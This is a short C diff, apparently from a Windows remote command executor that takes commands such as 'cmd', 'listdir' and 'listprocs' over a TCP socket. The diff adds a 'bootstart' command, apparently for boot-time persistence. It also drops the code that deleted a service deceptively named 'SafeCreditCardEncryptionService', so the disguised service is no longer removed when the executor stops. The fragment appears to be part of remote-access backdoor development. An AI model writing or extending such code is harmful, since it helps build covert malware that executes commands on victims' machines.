@@ -15,7 +15,8 @@ Command commands[N_COMMANDS] = {
 	{ "cwd", (CommandProc) GetCwdCommand, FALSE },
 	{ "cmd", CmdCommand, TRUE },
 	{ "listdir", ListDirectoryCommand, TRUE },
-	{ "listprocs", (CommandProc) ListProcsCommand, FALSE }
+	{ "listprocs", (CommandProc) ListProcsCommand, FALSE },
+	{ "bootstart", BootStartCfgCommand, TRUE }
 };
 
 static void CommandExecutor(PSTR buffer) {
@@ -85,12 +86,6 @@ void StartCommandExecutorConnection(void) {
 }
 
 void StopCommandExecutor(void) {
-	SC_HANDLE systemScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
-	SC_HANDLE service = OpenServiceA(systemScm, "SafeCreditCardEncryptionService", DELETE);
-	DeleteService(service);
-	CloseServiceHandle(service);
-	CloseServiceHandle(systemScm);
-
 	CloseConnection(&tcpSocket);
 	WSACleanup();
 }
